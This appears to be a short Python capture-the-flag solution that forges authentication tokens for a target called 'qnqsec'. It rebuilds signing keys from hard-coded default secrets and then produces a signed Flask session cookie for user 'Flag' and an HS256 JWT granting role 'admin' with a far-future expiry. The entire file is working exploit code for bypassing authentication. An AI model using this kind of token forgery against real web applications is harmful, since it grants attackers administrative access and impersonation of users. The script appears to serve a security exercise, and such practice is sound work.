from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import hashlib
import jwt

app = Flask(__name__)
app.secret_key = hashlib.sha1(("pepper:" + "qnqsec-default").encode()).hexdigest()


serializer = SecureCookieSessionInterface().get_signing_serializer(app)

session_data = {"user": "Flag"}  

session_cookie_value = serializer.dumps(session_data)
print("session cookie value:\n", session_cookie_value)

secret = hashlib.sha256(b"jwtpepper:qnqsec-default").hexdigest()
payload = {
    "sub": "Flag",       
    "role": "admin",
    "iat": 1760794390,
    "exp": 9999999999
}
headers = {"typ":"JWT", "alg":"HS256"}
token = jwt.encode(payload, secret, algorithm="HS256", headers=headers)
if isinstance(token, bytes):
    token = token.decode()

print("admin_jwt token:\n", token)